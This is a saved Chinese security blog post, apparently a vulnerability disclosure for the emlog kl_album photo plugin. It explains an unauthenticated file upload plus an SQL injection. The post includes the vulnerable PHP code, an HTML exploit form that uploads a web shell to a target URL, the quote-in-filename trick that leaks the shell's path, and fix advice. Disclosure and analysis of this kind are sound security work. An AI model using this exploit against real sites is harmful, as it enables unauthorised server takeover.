@@ -1,0 +1,476 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>emlog某重要插件前台SQL注入+Getshell | 离别歌</title>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/styles.css" rel="stylesheet"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/style.css" rel="stylesheet"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./emlog某重要插件前台SQL注入+Getshell  离别歌/jquery.min.js"></script>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/code.css" rel="stylesheet"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/button.css" rel="stylesheet"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./emlog某重要插件前台SQL注入+Getshell  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;text=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;title=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;is_video=false&amp;description=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;title=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;title=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;title=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;title=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html&amp;name=emlog%E6%9F%90%E9%87%8D%E8%A6%81%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%2BGetshell&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">emlog某重要插件前台SQL注入+Getshell</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年11月12日 16:37" itemprop="datePublished">
+                    2014 十一月 12 16:37
+                </time>
+</div>
+<div class="article-tag">
+            阅读：7264
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/emlog%E6%8F%92%E4%BB%B6">emlog插件</a>,
+                
+                <a class="tag-link" href="/tag/getshell">getshell</a>,
+                
+                <a class="tag-link" href="/tag/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">上传漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+	    真是醉了，前两天在鼓捣其他事情需要图片外链，我就直接用了自己博客用了很久的“EM相册”插件。我顺势看了看代码，还真被我看出事了……
+</p>
+<p>
+	    EM相册是emlog最早的插件之一（插件页面：<a href="http://www.emlog.net/plugin/6" target="_blank">http://www.emlog.net/plugin/6</a> 。id为6，可想而知），作者是现在身为emlog社区超版的KLLER，下载量也是很大的：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201411/4efd1415784839.jpg" id="ematt:642" target="_blank"><img alt="01.jpg" border="0" height="282" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/thum-4efd1415784839.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+	    下载以后解压，<span style="line-height:1.5;">看到kl_album_ajax_do.php： </span>
+</p>
+<pre class="brush: php;auto-links: false;">&lt;?php
+/**
+ * kl_album_ajax_do.php
+ * design by KLLER
+ */
+require_once('../../../init.php');
+$DB = MySql::getInstance();
+$kl_album_config = unserialize(Option::get('kl_album_config'));
+if(isset($_POST['album']) &amp;&amp; isset($_FILES['Filedata'])){
+	if(function_exists('ini_get')){
+		$kl_album_memory_limit = ini_get('memory_limit');
+		$kl_album_memory_limit = substr($kl_album_memory_limit, 0, strlen($kl_album_memory_limit)-1);
+		$kl_album_memory_limit = ($kl_album_memory_limit+20).'M';
+		ini_set('memory_limit', $kl_album_memory_limit);
+	}
+	define('KL_UPLOADFILE_MAXSIZE', kl_album_get_upload_max_filesize());
+	define('KL_UPLOADFILE_PATH', '../../../content/plugins/kl_album/upload/');
+	define('KL_IMG_ATT_MAX_W',	100);//图片附件缩略图最大宽
+	define('KL_IMG_ATT_MAX_H',	100);//图片附件缩略图最大高
+	$att_type = array('jpg', 'jpeg', 'png', 'gif');//允许上传的文件类型
+	$album = isset($_POST['album']) ? intval($_POST['album']) : '';
+	if($_FILES['Filedata']['error'] != 4){
+		$upfname = kl_album_upload_file($_FILES['Filedata']['name'], $_FILES['Filedata']['error'], $_FILES['Filedata']['tmp_name'], $_FILES['Filedata']['size'], $_FILES['Filedata']['type'], $att_type);
+		$photo_size = chImageSize(EMLOG_ROOT.substr($upfname, 2), KL_IMG_ATT_MAX_W, KL_IMG_ATT_MAX_H);
+		$result = $DB-&gt;query("INSERT INTO ".DB_PREFIX."kl_album(truename, filename, description, album, addtime, w, h) VALUES('{$_FILES['Filedata']['name']}', '{$upfname}', '".date('Y-m-d', time())."', {$album}, ".time().", {$photo_size['w']}, {$photo_size['h']})");
+		if($result){
+			$new_id = $DB-&gt;insert_id();
+			$the_option_value = Option::get('kl_album_'.$album);
+			if($the_option_value !== null){
+				$the_option_value = trim($new_id.','.$the_option_value, ',');
+				Option::updateOption('kl_album_'.$album, $the_option_value);
+				$CACHE-&gt;updateCache('options');
+			}
+		}
+	}
+	exit;
+}
+if(ROLE != 'admin') exit('access deined!');
+if(isset($_GET['action']) &amp;&amp; $_GET['action']!=''){...</pre>
+    可见，验证身份（倒数第二行）的代码在上传的代码后面，所以任意用户均可上传文件。那么我们来看看上传部分。里面似乎定义了一个$att_type = array('jpg', 'jpeg', 'png', 'gif');，并将$att_type这个变量和$_FILES一起传入了kl_album_upload_file函数。我们进去看看：
+<pre class="brush: php;auto-links: false;">function kl_album_upload_file($filename, $errorNum, $tmpfile, $filesize, $filetype, $type, $isIcon = 0){
+	$kl_album_config = unserialize(Option::get('kl_album_config'));
+	$extension  = strtolower(substr(strrchr($filename, "."),1));
+	$uppath = KL_UPLOADFILE_PATH . date("Ym") . "/";
+	$fname = md5($filename) . date("YmdHis") . rand() .'.'. $extension;
+	$attachpath = $uppath . $fname;
+	if(!is_dir(KL_UPLOADFILE_PATH)){
+		umask(0);
+		$ret = @mkdir(KL_UPLOADFILE_PATH, 0777);
+		if($ret === false) return '创建文件上传目录失败';
+	}
+	if(!is_dir($uppath)){
+		umask(0);
+		$ret = @mkdir($uppath, 0777);
+		if($ret === false) return "上传失败。文件上传目录(content/plugins/kl_album/upload)不可写";
+	}
+	doAction('kl_album_upload', $tmpfile);
+	//缩略
+	$imtype = array('jpg','png','jpeg','gif');
+	$thum = $uppath."thum-". $fname;
+	$attach = in_array($extension, $imtype) &amp;&amp; function_exists("ImageCreate") &amp;&amp; kl_album_resize_image($tmpfile,$filetype,$thum,$isIcon,KL_IMG_ATT_MAX_W,KL_IMG_ATT_MAX_H) ? $thum : $attachpath;
+	$kl_album_compression_length = isset($kl_album_config['compression_length']) ? intval($kl_album_config['compression_length']) : 1024;
+	$kl_album_compression_width = isset($kl_album_config['compression_width']) ? intval($kl_album_config['compression_width']) : 768;
+	if($kl_album_compression_length == 0 || $kl_album_compression_width == 0){
+		if(@is_uploaded_file($tmpfile)){
+			if(@!move_uploaded_file($tmpfile ,$attachpath)){
+				@unlink($tmpfile);
+				return "上传失败。文件上传目录(content/plugins/kl_album/upload)不可写";
+			}else{
+				echo 'kl_album_successed';
+			}
+			chmod($attachpath, 0777);
+		}
+	}else{
+		if(in_array($extension, $imtype) &amp;&amp; function_exists("ImageCreate") &amp;&amp; kl_album_resize_image($tmpfile,$filetype,$attachpath,$isIcon,$kl_album_compression_length,$kl_album_compression_width)){
+			echo 'kl_album_successed';
+		}else{
+			if(@is_uploaded_file($tmpfile)){
+				if(@!move_uploaded_file($tmpfile ,$attachpath)){
+					@unlink($tmpfile);
+					return "上传失败。文件上传目录(content/plugins/kl_album/upload)不可写";
+				}else{
+					echo 'kl_album_successed';
+				}
+				chmod($attachpath, 0777);
+			}
+		}
+	}
+	$attach = substr($attach, 6, strlen($attach));
+	return 	$attach;
+}</pre>
+    <span style="line-height:1.5;">我们可以看看，实际上我们传入的$type这个变量在这个函数里根本没有用到！</span>
+<p>
+<br>
+</br></p>
+<p>
+<span style="line-height:1.5;">    函数中定义了一个$imtype = array('jpg','png','jpeg','gif');，也不是用来验证后缀的，而是判断是否需要生成缩略图的。所以重点就是下面几行： </span>
+</p>
+<pre class="brush: php;auto-links: false;">$extension  = strtolower(substr(strrchr($filename, "."),1));
+$uppath = KL_UPLOADFILE_PATH . date("Ym") . "/";
+$fname = md5($filename) . date("YmdHis") . rand() .'.'. $extension;
+$attachpath = $uppath . $fname;
+...
+if(@!move_uploaded_file($tmpfile ,$attachpath)){</pre>
+<p>
+<br>
+</br></p>
+<p>
+<span style="line-height:1.5;">    这里，我们可以发现上传的文件名是md5($filename) . date("YmdHis") . rand() .'.'. $extension;，原名的md5值+时间+rand随机数+后缀。md5值和时间基本比较好确定的，但是rand()随机数一般都有65535个可能性。<br/>
+</span>
+</p>
+<p>
+<span style="line-height:1.5;">    而且我们看到后面的代码，并没有把文件名输出的地方，只是echo 'kl_album_successed';。</span>
+</p>
+<p>
+<span style="line-height:1.5;">    难道我们需要暴力跑shell名字？</span>
+</p>
+<p>
+<span style="line-height:1.5;">    我们返回kl_album_ajax_do.php，可以发现上传的if语句中有如下代码： </span>
+</p>
+<pre class="brush: php;auto-links: false;">$result = $DB-&gt;query("INSERT INTO ".DB_PREFIX."kl_album(truename, filename, description, album, addtime, w, h) VALUES('{$_FILES['Filedata']['name']}', '{$upfname}', '".date('Y-m-d', time())."', {$album}, ".time().", {$photo_size['w']}, {$photo_size['h']})");</pre>
+    将$_FILES['Filedata']['name']直接插入数据库。这里另造成了一个SQL注入漏洞，当然既然有之前的getshell，这里的注入就有点当陪衬了。不过emlog在遇到SQL语句出错的情况下是会报错的。<br/>
+<p>
+<br/>
+</p>
+<p>
+<span style="line-height:1.5;">    所以所以，这里我们正好用到这个特性，通过报错可以将$upfname这个字段爆出来，这也就是我们上传成功的shell名字。<br/>
+</span>
+</p>
+<p>
+<span style="line-height:1.5;">    如何报错？上传文件名里加个单引号即可。<br/>
+</span>
+</p>
+<p>
+<span style="line-height:1.5;"><br/>
+</span>
+</p>
+<p>
+<span style="line-height:1.5;">    所以，我来一份利用代码： </span>
+</p>
+<pre class="brush: php;auto-links: false;">&lt;form id="exp" method="post" enctype="multipart/form-data"&gt;
+&lt;p&gt;target url &gt; &lt;input id="url" type="text" style="width: 300px"&gt;&lt;/p&gt;
+&lt;p&gt;shell file &gt; &lt;input type="file" name="Filedata"&gt;&lt;/p&gt;
+&lt;input name="album" type="hidden" value="111111" &gt;
+&lt;p&gt;&lt;input type="submit" value="GO!" onclick="exp.action=url.value+'/content/plugins/kl_album/kl_album_ajax_do.php';"&gt;&lt;/p&gt;
+&lt;/form&gt;</pre>
+    保存为html，本地打开：<br/>
+<p>
+<br/>
+</p>
+<p>
+<span style="line-height:1.5;">    <a href="https://www.leavesongs.com/content/uploadfile/201411/3fb51415792237.jpg" id="ematt:644" target="_blank"><img alt="02.jpg" border="0" height="148" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/3fb51415792237.jpg" title="点击查看原图" width="630"/></a><br/>
+</span>
+</p>
+<p>
+	    填入目标url，并选择要上传的shell。（如图，我这里是info'.php，会令SQL出错）。点击GO!
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201411/f9961415792320.jpg" id="ematt:645" target="_blank"><img alt="03.jpg" border="0" height="211" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/thum-f9961415792320.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+	    出错了，可以发现文件名已经爆出来了：../content/plugins/kl_album/upload/201411/38493d4468377f721357e9c64f93637d2014111211381611097.php
+</p>
+<p>
+	    访问可见shell：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201411/2de41415792427.jpg" id="ematt:649" target="_blank"><img alt="04.jpg" border="0" height="344" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/thum-2de41415792427.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<br/>
+</p>
+<p>
+	    修复方案：
+</p>
+<p>
+	    给个暂时性的方法吧：卸载插件。
+</p>
+<p>
+	    如果你用相册用的多，不能删插件，那就将if(ROLE != 'admin') exit('access deined!');这句话移到上传代码上面，这样漏洞遍从一个“无需登录getshell”变成了“管理员权限getshell”，基本没危害了。毕竟emlog后台管理员是可以直接拿shell的。
+</p>
+<p>
+	    剩下的，那就是该解决文件上传解决文件上传，该修注入的修注入了。方法我就不多说了。
+</p>
+<p>
+<br/>
+</p>
+<p>
+	    官方已更新插件版本，所以文章公开。提供一个存在漏洞的版本给大家测试：<span class="attachment"><a href="https://www.leavesongs.com/content/uploadfile/201411/07021415866191.zip" target="_blank">kl_album.zip</a></span>
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2070">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/4da279cded23858594cf8834bcf50818.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://ymhack.com" target="_blank">沧澜</a>
+<time datetime="2015年5月13日 21:01" itemprop="datePublished">
+                            2015 五月 13 21:01
+                        </time>
+<a href="javascript:reply_to('2070', '沧澜')">回复</a>
+</p>
+<p class="comment-meta">原来是离歌前辈的大作，学习了</p>
+</div>
+</div>
+<div class="row" id="comment-2048">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/5d5556a7749617062d9460a6c43bbd1a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.waitalone.cn/" target="_blank">独自等待</a>
+<time datetime="2015年5月4日 11:38" itemprop="datePublished">
+                            2015 五月 04 11:38
+                        </time>
+<a href="javascript:reply_to('2048', '独自等待')">回复</a>
+</p>
+<p class="comment-meta">文章分析的不错，已经转载并保留了版权。</p>
+</div>
+</div>
+<div class="row" id="comment-1879">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/16e95396d3f2fd817779fb318a3ea99a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.03sec.com" target="_blank">sky</a>
+<time datetime="2014年12月4日 15:16" itemprop="datePublished">
+                            2014 十二月 04 15:16
+                        </time>
+<a href="javascript:reply_to('1879', 'sky')">回复</a>
+</p>
+<p class="comment-meta">排版有点乱，可否考虑下用个代码高亮的那种插件。</p>
+</div>
+</div>
+<div class="row" id="comment-1861">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.tinydawn.com/" target="_blank">D_M</a>
+<time datetime="2014年11月23日 10:36" itemprop="datePublished">
+                            2014 十一月 23 10:36
+                        </time>
+<a href="javascript:reply_to('1861', 'D_M')">回复</a>
+</p>
+<p class="comment-meta">吓尿了。。。做了好多个外包，都用的这个相册插件。。。。。。。。。<br/>来膜拜</p>
+</div>
+</div>
+<div class="row" id="comment-1858">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/a8b8e5c15da5db11f68b1f2e0f03b110.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">东吃</a>
+<time datetime="2014年11月22日 10:31" itemprop="datePublished">
+                            2014 十一月 22 10:31
+                        </time>
+<a href="javascript:reply_to('1858', '东吃')">回复</a>
+</p>
+<p class="comment-meta">报错那个地方亮了~ 学习了</p>
+</div>
+</div>
+<div class="row" id="comment-1842">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/d5b234984190822adf2f31a4d5a371bb.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://joychou.org" target="_blank">JoyChou</a>
+<time datetime="2014年11月13日 20:02" itemprop="datePublished">
+                            2014 十一月 13 20:02
+                        </time>
+<a href="javascript:reply_to('1842', 'JoyChou')">回复</a>
+</p>
+<p class="comment-meta">虽然不知道你在说什么，但是感觉很厉害的样子。</p>
+</div>
+</div>
+<div class="row" id="comment-1841">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/7fc2d5c0b745eb9df8e5cb662d8535c3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://sh3ll.me" target="_blank">Chu</a>
+<time datetime="2014年11月13日 16:39" itemprop="datePublished">
+                            2014 十一月 13 16:39
+                        </time>
+<a href="javascript:reply_to('1841', 'Chu')">回复</a>
+</p>
+<p class="comment-meta">来膜拜</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="2cb46a56e56dd95674553547764c36a69b913a5b"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./emlog某重要插件前台SQL注入+Getshell  离别歌/2cb46a56e56dd95674553547764c36a69b913a5b"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="335">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="N2nKasWhVWnXuoial1b36wyoggOzReGBlmIgYW8wmJhmu3Gp9iFNFaAtpkhHAIvL"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./emlog某重要插件前台SQL注入+Getshell  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./emlog某重要插件前台SQL注入+Getshell  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
